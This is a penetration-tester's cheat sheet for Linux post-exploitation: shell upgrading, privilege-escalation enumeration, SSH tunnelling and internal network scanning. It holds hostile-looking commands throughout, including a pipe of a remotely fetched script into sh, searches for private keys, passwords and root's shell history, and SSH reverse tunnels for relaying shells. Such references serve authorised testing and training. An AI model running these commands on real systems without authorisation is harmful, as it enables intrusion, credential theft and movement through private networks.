# Pivoting & Privilege Escalation CHEAT SHEET
## 1. WHAT IS LINUX PIVOTING / PRIVESC?

After getting initial access on a Linux host, the next phase is:

- **Privilege Escalation (PrivEsc)** — become root to own the box
- **Pivoting** — use the box to reach other internal hosts
- **Tunneling** — route traffic through SSH or other channels
- **Enumeration** — automate discovery of misconfigurations

**Key fact:** 90% of Linux Privesc comes from misconfigured sudo, SUID binaries, cron jobs, or exposed credentials.

---

## 2. TTY UPGRADE (ESSENTIAL)

After obtaining a reverse shell, upgrade to a full interactive TTY.

```bash
# Step 1: Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash
script -qc /bin/bash /dev/null

# Step 2: Background (Ctrl+Z)

# Step 3: Configure local terminal
stty raw -echo; fg

# Step 4: Reset and configure
reset
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 120
```

---

## 3. PRIVILEGE ESCALATION ENUMERATION

### 3.1 LinPEAS (Automated Enumeration)

```bash
# Download and run
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# Or via curl
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Save output
/tmp/linpeas.sh -a > /tmp/linpeas_output.txt 2>&1
```

### 3.2 Other Enumeration Tools

```bash
# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Linux Smart Enumeration
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh

# pspy (monitor processes without root)
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
```

### 3.3 Quick Manual Checks

```bash
# Sudo permissions
sudo -l
sudo -l -U $(whoami)

# SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# SGID binaries
find / -perm -g=s -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Writable files/dirs
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

# Kernel version (search exploits)
uname -a
cat /etc/os-release

# Passwords in files
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# History files
cat ~/.bash_history
cat /root/.bash_history 2>/dev/null
```

---

## 4. SSH — TUNNELS AND PORT FORWARDING

### 4.1 SSH Key Setup (Fast Access)

```bash
# Copy your public key to the target
ssh-copy-id user@10.0.59.116
ssh-copy-id -i ~/.ssh/id_rsa.pub user@host

# Now login without password
ssh user@10.0.59.116
```

### 4.2 Local Port Forwarding (-L)

Redirect a local port to a remote service (through the SSH host).

```bash
# Access remote 10.0.0.1:80 via local port 8585
ssh -N -L 8585:10.0.0.1:80 user@jump-host

# Access via all interfaces (useful for external pivoting)
ssh -N -L *:8585:10.0.0.1:80 user@jump-host

# Multiple forwards in one command
ssh -N -L 8080:internal:80 -L 3306:internal:3306 user@jump-host
```

### 4.3 Remote Port Forwarding (-R)

Expose a local service to the remote side (reverse tunnel).

```bash
# Make target's port 9000 forward to your local 3000
ssh -N -R 9000:localhost:3000 user@target

# Reverse shell via SSH tunnel (very common in pivoting)
ssh -N -R 4444:localhost:4444 user@target
```

### 4.4 Dynamic Port Forwarding (SOCKS Proxy) (-D)

```bash
# Create a SOCKS5 proxy on local port 1080 through SSH host
ssh -N -D 1080 user@jump-host

# Use with proxychains
proxychains nmap -sT -Pn 10.0.0.0/24
proxychains curl http://internal-service
```

### 4.5 Common Pivoting Examples

```bash
# Access internal Proxmox/web UI
ssh -N -L *:8585:0.0.0.0:8006 root@192.168.0.5

# Tunnel internal RDP
ssh -N -L 3389:10.0.0.20:3389 user@jump-host

# Tunnel internal MySQL
ssh -N -L 3306:10.0.0.30:3306 user@jump-host
```

### 4.6 SSH with Legacy Algorithms (Old Targets)

```bash
ssh -oKexAlgorithms=curve25519-sha256 user@10.129.8.178
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@target
ssh -oHostKeyAlgorithms=+ssh-rsa user@target
ssh -oCiphers=+aes128-cbc user@target
```

---

## 5. NETWORK RECON FROM PIVOT

### 5.1 Masscan — Fast Network Sweep

```bash
# Sweep /16 network (ping only, fast)
sudo masscan 10.0.0.0/16 --ping --rate 5000 -oL total_activos.txt
sudo masscan 192.168.0.0/16 --ping --rate 5000 -oL total_activos.txt

# Then feed live hosts into nmap
awk '/open/ {print $4}' total_activos.txt | nmap -sL -iL -
```

### 5.2 Nmap One-Liners for Pivoting

```bash
# Full port scan + service + scripts on a target
IP="10.129.244.146"
ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -Pn -p$ports -sC -sV $ip

# Same in one line
IP=10.129.22.156; ports=$(nmap --open $IP | grep open | cut -d ' ' -f 1 | cut -d '/' -f 1 | paste -sd,); nmap $IP -p $ports -sV -sC -Pn --disable-arp-ping

# IPv6 neighbors scan
ip -6 neigh | awk '{print $1}' | grep ':' | xargs -I{} sudo nmap -6 -T5 {}
```

### 5.3 Quick Port Probe (No Nmap)

```bash
for p in 22 80 443 4444; do echo "" | nc -nv -w2 100.75.115.107 "$p"; done
```

### 5.4 Probing Unknown Services on a Port

```bash
nmap -sV -sC -p 6668 192.168.100.106
nc 192.168.100.106 6668
telnet 192.168.100.106 6668
nmap -A -p 6668 192.168.100.106

# Send manual protocol probes
printf "NICK test\r\nUSER test 0 * :test\r\n" | nc 192.168.100.106 6668
printf "GET / HTTP/1.0\r\n\r\n" | nc 192.168.100.106 6668
curl -v 192.168.100.106:6668

# Deep probing
sudo nmap -Pn -sS -sV --version-all -O -p 6668 192.168.100.106
sudo nmap -Pn -p6668 --script=banner 192.168.100.106
sudo nmap -Pn -sU -p6668 192.168.100.106

# TLS check
openssl s_client -connect 192.168.100.106:6668

# Custom binary probe with Python
python3 -c "import socket; s=socket.socket(); s.connect(('192.168.100.106',6668)); s.send(b'\x00\x01\x02\x03'); print(s.recv(1024))"

# Capture the traffic while probing
sudo tcpdump -i any host 192.168.100.106 and port 6668 -nn -X
```

---

## 6. TIPS

1. Always upgrade TTY before running any heavy tool.
2. Run linpeas before doing manual checks — it catches almost everything.
3. Use `sudo -l` first — misconfigured sudoers is the #1 privesc.
4. For pivoting, prefer SSH if you have credentials; otherwise use chisel / ligolo-ng.
5. Masscan is much faster than nmap for sweeping large ranges.
6. Always use `-N` in SSH tunnels when you don't need a shell.
7. Test SSH tunnels with `curl`/`nc` to confirm they work.
8. Save linpeas output to a file for offline review.
9. Combine `pspy` with manual cron analysis to catch hidden jobs.
10. Only pivot inside authorized scope.

---
